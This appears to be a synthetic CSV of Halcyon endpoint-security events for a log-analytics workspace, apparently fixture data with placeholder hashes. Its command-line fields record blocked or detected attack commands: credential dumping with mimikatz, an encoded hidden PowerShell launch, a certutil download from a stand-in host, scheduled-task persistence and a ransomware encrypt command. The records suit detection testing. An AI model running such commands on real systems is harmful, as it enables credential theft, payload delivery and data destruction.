TimeGenerated [UTC],time,activity_id,activity_name,category_uid,category_name,class_uid,class_name,type_uid,type_name,severity_id,severity,message,raw_data,raw_record,status_id,status,action_id,action,disposition_id,disposition,rcode,rcode_id,metadata,unmapped,actor,device,file,process,user,dst_endpoint,src_endpoint,traffic,query,answers,driver,module,app,HalcyonEventId,HalcyonSourceTime,TenantId,Type,_ResourceId
2026-07-22T08:00:00Z,1784707200000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: evil.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000001""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000001""}","{""process"": {""pid"": 6601, ""cmd_line"": ""\""C:\\Windows\\explorer.exe\"""", ""file"": {""name"": ""explorer.exe"", ""path"": ""C:\\Windows\\explorer.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003e9""}]}, ""parent_process"": {""pid"": 701}}, ""user"": {""name"": ""CORP\\jdoe"", ""uid"": ""S-1-5-21-1001""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0001.corp.local"", ""uid"": ""dev-0001""}",,"{""pid"": 6601, ""file"": {""name"": ""evil.exe"", ""path"": ""C:\\Temp\\evil.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000001""}]}, ""cmd_line"": ""evil.exe -runkey HKCU""}",,,,,,,,,,e2000000-0000-0000-0000-000000000001,2026-07-22T08:00:00Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T08:14:07Z,1784708047000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,4,High,Halcyon detected process: dropper.exe,,,1,Success,1,Allowed,15,Detected,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000002""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000002""}","{""process"": {""pid"": 6602, ""cmd_line"": ""cmd /c dropper.exe"", ""file"": {""name"": ""cmd.exe"", ""path"": ""C:\\Windows\\System32\\cmd.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003ea""}]}, ""parent_process"": {""pid"": 702}}, ""user"": {""name"": ""CORP\\analyst"", ""uid"": ""S-1-5-21-1002""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0002.corp.local"", ""uid"": ""dev-0002""}",,"{""pid"": 6602, ""file"": {""name"": ""dropper.exe"", ""path"": ""C:\\Users\\Public\\dropper.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000002""}]}, ""cmd_line"": ""dropper.exe /silent /install""}",,,,,,,,,,e2000000-0000-0000-0000-000000000002,2026-07-22T08:14:07Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T08:28:14Z,1784708894000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: powershell.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000003""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""NefariousCmdLine"", ""halcyon_alert_id"": ""alert-000003""}","{""process"": {""pid"": 6603, ""cmd_line"": ""cmd /c powershell ..."", ""file"": {""name"": ""cmd.exe"", ""path"": ""C:\\Windows\\System32\\cmd.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003eb""}]}, ""parent_process"": {""pid"": 703}}, ""user"": {""name"": ""CORP\\svc-admin"", ""uid"": ""S-1-5-21-1003""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0003.corp.local"", ""uid"": ""dev-0003""}",,"{""pid"": 6603, ""file"": {""name"": ""powershell.exe"", ""path"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000003""}]}, ""cmd_line"": ""powershell -nop -w hidden -enc SQBFAFgA""}",,,,,,,,,,e2000000-0000-0000-0000-000000000003,2026-07-22T08:28:14Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T08:42:21Z,1784709741000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,4,High,Halcyon blocked process: wscript.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000004""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000004""}","{""process"": {""pid"": -1}, ""user"": {""name"": ""CORP\\jdoe"", ""uid"": ""S-1-5-21-1001""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0004.corp.local"", ""uid"": ""dev-0004""}",,"{""pid"": 6604, ""file"": {""name"": ""wscript.exe"", ""path"": ""C:\\Windows\\System32\\wscript.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000004""}]}}",,,,,,,,,,e2000000-0000-0000-0000-000000000004,2026-07-22T08:42:21Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T08:56:28Z,1784710588000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: mimikatz.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000005""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""NefariousCmdLine"", ""halcyon_alert_id"": ""alert-000005""}","{""process"": {""pid"": 6605, ""cmd_line"": ""powershell -c ./mimi"", ""file"": {""name"": ""powershell.exe"", ""path"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003ed""}]}, ""parent_process"": {""pid"": 705}}, ""user"": {""name"": ""CORP\\administrator"", ""uid"": ""S-1-5-21-1004""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0005.corp.local"", ""uid"": ""dev-0005""}",,"{""pid"": 6605, ""file"": {""name"": ""mimikatz.exe"", ""path"": ""C:\\Temp\\mimikatz.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000005""}]}, ""cmd_line"": ""mimikatz.exe sekurlsa::logonpasswords""}",,,,,,,,,,e2000000-0000-0000-0000-000000000005,2026-07-22T08:56:28Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T09:10:35Z,1784711435000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,3,Medium,Halcyon detected process: rundll32.exe,,,1,Success,1,Allowed,15,Detected,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000006""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""NefariousCmdLine"", ""halcyon_alert_id"": ""alert-000006""}","{""process"": {""pid"": 6606, ""cmd_line"": ""services.exe"", ""file"": {""name"": ""services.exe"", ""path"": ""C:\\Windows\\System32\\services.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003ee""}]}, ""parent_process"": {""pid"": 706}}, ""user"": {""name"": ""CORP\\analyst"", ""uid"": ""S-1-5-21-1002""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""WKSTN-06"", ""uid"": ""dev-0006""}",,"{""pid"": 6606, ""file"": {""name"": ""rundll32.exe"", ""path"": ""C:\\Windows\\System32\\rundll32.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000006""}]}, ""cmd_line"": ""rundll32.exe evil.dll,Start""}",,,,,,,,,,e2000000-0000-0000-0000-000000000006,2026-07-22T09:10:35Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T09:24:42Z,1784712282000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,4,High,Halcyon blocked process: regsvr32.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000007""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000007""}","{""process"": {""pid"": -1}, ""user"": {""name"": ""CORP\\jdoe"", ""uid"": ""S-1-5-21-1001""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0007.corp.local"", ""uid"": ""dev-0007""}",,"{""pid"": 6607, ""file"": {""name"": ""regsvr32.exe"", ""path"": ""C:\\Windows\\System32\\regsvr32.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000007""}]}}",,,,,,,,,,e2000000-0000-0000-0000-000000000007,2026-07-22T09:24:42Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T09:38:49Z,1784713129000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: ransom.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000008""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000008""}","{""process"": {""pid"": 6608, ""cmd_line"": ""cmd /c ransom.exe"", ""file"": {""name"": ""cmd.exe"", ""path"": ""C:\\Windows\\System32\\cmd.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003f0""}]}, ""parent_process"": {""pid"": 708}}, ""user"": {""name"": ""CORP\\svc-admin"", ""uid"": ""S-1-5-21-1003""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0008.corp.local"", ""uid"": ""dev-0008""}",,"{""pid"": 6608, ""file"": {""name"": ""ransom.exe"", ""path"": ""C:\\ProgramData\\ransom.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000008""}]}, ""cmd_line"": ""ransom.exe --encrypt --path C:\\""}",,,,,,,,,,e2000000-0000-0000-0000-000000000008,2026-07-22T09:38:49Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T09:52:56Z,1784713976000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: cobaltstrike.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000009""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000009""}","{""process"": {""pid"": -1}, ""user"": {""name"": ""CORP\\analyst"", ""uid"": ""S-1-5-21-1002""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0009.corp.local"", ""uid"": ""dev-0009""}",,"{""pid"": 6609, ""file"": {""name"": ""cobaltstrike.exe"", ""path"": ""C:\\Temp\\cobaltstrike.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000009""}]}}",,,,,,,,,,e2000000-0000-0000-0000-000000000009,2026-07-22T09:52:56Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T10:06:03Z,1784714763000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,4,High,Halcyon detected process: certutil.exe,,,1,Success,1,Allowed,15,Detected,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000010""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""NefariousCmdLine"", ""halcyon_alert_id"": ""alert-000010""}","{""process"": {""pid"": 6610, ""cmd_line"": ""powershell -c certutil"", ""file"": {""name"": ""powershell.exe"", ""path"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003f2""}]}, ""parent_process"": {""pid"": 710}}, ""user"": {""name"": ""CORP\\administrator"", ""uid"": ""S-1-5-21-1004""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0010.corp.local"", ""uid"": ""dev-0010""}",,"{""pid"": 6610, ""file"": {""name"": ""certutil.exe"", ""path"": ""C:\\Windows\\System32\\certutil.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""000000000000000000000000000000000000000000000000000000000000000a""}]}, ""cmd_line"": ""certutil -urlcache -f http://bad/x.exe""}",,,,,,,,,,e2000000-0000-0000-0000-000000000010,2026-07-22T10:06:03Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T10:20:10Z,1784715610000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,3,Medium,Halcyon detected process: schtasks.exe,,,1,Success,1,Allowed,15,Detected,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000011""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""NefariousCmdLine"", ""halcyon_alert_id"": ""alert-000011""}","{""process"": {""pid"": 6611, ""cmd_line"": ""cmd /c schtasks"", ""file"": {""name"": ""cmd.exe"", ""path"": ""C:\\Windows\\System32\\cmd.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003f3""}]}, ""parent_process"": {""pid"": 711}}, ""user"": {""name"": ""CORP\\jdoe"", ""uid"": ""S-1-5-21-1001""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""LAPTOP-11"", ""uid"": ""dev-0011""}",,"{""pid"": 6611, ""file"": {""name"": ""schtasks.exe"", ""path"": ""C:\\Windows\\System32\\schtasks.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""000000000000000000000000000000000000000000000000000000000000000b""}]}, ""cmd_line"": ""schtasks /create /tn evil /tr evil.exe""}",,,,,,,,,,e2000000-0000-0000-0000-000000000011,2026-07-22T10:20:10Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T10:34:17Z,1784716457000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,4,High,Halcyon blocked process: bitsadmin.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000012""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000012""}","{""process"": {""pid"": -1}, ""user"": {""name"": ""CORP\\svc-admin"", ""uid"": ""S-1-5-21-1003""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0012.corp.local"", ""uid"": ""dev-0012""}",,"{""pid"": 6612, ""file"": {""name"": ""bitsadmin.exe"", ""path"": ""C:\\Windows\\System32\\bitsadmin.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""000000000000000000000000000000000000000000000000000000000000000c""}]}}",,,,,,,,,,e2000000-0000-0000-0000-000000000012,2026-07-22T10:34:17Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T10:48:24Z,1784717304000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: scarab.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000013""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000013""}","{""process"": {""pid"": 6613, ""cmd_line"": ""services.exe"", ""file"": {""name"": ""services.exe"", ""path"": ""C:\\Windows\\System32\\services.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003f5""}]}, ""parent_process"": {""pid"": 713}}, ""user"": {""name"": ""CORP\\administrator"", ""uid"": ""S-1-5-21-1004""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0013.corp.local"", ""uid"": ""dev-0013""}",,"{""pid"": 6613, ""file"": {""name"": ""scarab.exe"", ""path"": ""C:\\ProgramData\\scarab.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""000000000000000000000000000000000000000000000000000000000000000d""}]}, ""cmd_line"": ""scarab.exe -enc""}",,,,,,,,,,e2000000-0000-0000-0000-000000000013,2026-07-22T10:48:24Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T11:02:31Z,1784718151000,2,Terminate,1,System Activity,1007,Process Activity,100702,Process Activity: Terminate,4,High,Halcyon detected process: evil.exe,,,1,Success,1,Allowed,15,Detected,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000014""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000014""}","{""process"": {""pid"": 6614, ""cmd_line"": ""\""C:\\Windows\\explorer.exe\"""", ""file"": {""name"": ""explorer.exe"", ""path"": ""C:\\Windows\\explorer.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003f6""}]}, ""parent_process"": {""pid"": 714}}, ""user"": {""name"": ""CORP\\jdoe"", ""uid"": ""S-1-5-21-1001""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0001.corp.local"", ""uid"": ""dev-0014""}",,"{""pid"": 6614, ""file"": {""name"": ""evil.exe"", ""path"": ""C:\\Temp\\evil.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""000000000000000000000000000000000000000000000000000000000000000e""}]}, ""cmd_line"": ""evil.exe"", ""exit_code"": 3221225477, ""exit_time"": 1784718151500}",,,,,,,,,,e2000000-0000-0000-0000-000000000014,2026-07-22T11:02:31Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T11:16:38Z,1784718998000,2,Terminate,1,System Activity,1007,Process Activity,100702,Process Activity: Terminate,4,High,Halcyon detected process: ransom.exe,,,1,Success,1,Allowed,15,Detected,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000015""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000015""}","{""process"": {""pid"": 6615, ""cmd_line"": ""cmd /c ransom.exe"", ""file"": {""name"": ""cmd.exe"", ""path"": ""C:\\Windows\\System32\\cmd.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003f7""}]}, ""parent_process"": {""pid"": 715}}, ""user"": {""name"": ""CORP\\svc-admin"", ""uid"": ""S-1-5-21-1003""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0008.corp.local"", ""uid"": ""dev-0015""}",,"{""pid"": 6615, ""file"": {""name"": ""ransom.exe"", ""path"": ""C:\\ProgramData\\ransom.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""000000000000000000000000000000000000000000000000000000000000000f""}]}, ""cmd_line"": ""ransom.exe"", ""exit_code"": 3221225477, ""exit_time"": 1784718998500}",,,,,,,,,,e2000000-0000-0000-0000-000000000015,2026-07-22T11:16:38Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
